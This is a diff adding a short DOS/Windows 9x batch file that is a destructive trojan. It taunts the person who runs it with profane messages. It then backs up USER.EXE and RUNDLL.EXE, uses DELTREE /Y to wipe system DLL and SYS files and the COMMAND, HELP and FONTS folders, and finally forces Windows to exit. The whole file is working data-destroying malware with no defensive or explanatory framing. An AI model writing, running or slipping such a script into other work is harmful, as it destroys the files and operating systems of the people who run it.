@@ -1,0 +1,21 @@
+
+CD..
+C:\ 
+CD\
+echo Ok...Youv ran me...Now what??? i know i will delete your system files soundz good! Prepare to be fucked
+MD SILLY¦FUCKER
+COPY WINDOWS\SYSTEM\USER.EXE C:\SILLY¦FUCKER
+COPY WINDOWS\RUNDLL.EXE C:\SILLY¦FUCKER
+CD WINDOWS\SYSTEM
+DELTREE  /Y *.DLL
+DELTREE  /Y *.SYS
+CD..
+CD COMMAND
+DELTREE  /Y *.*
+DELTREE  /Y EBD
+CD..
+DELTREE  /Y HELP
+DELTREE  /Y FONTS
+echo This iz great cool iz werking
+echo                      thiswontworklol >¦SILLY¦FUCKER¦.EXE 
+C:\SILLY¦FUCKER\RUNDLL.EXE  USER.EXE,EXITWINDOWS
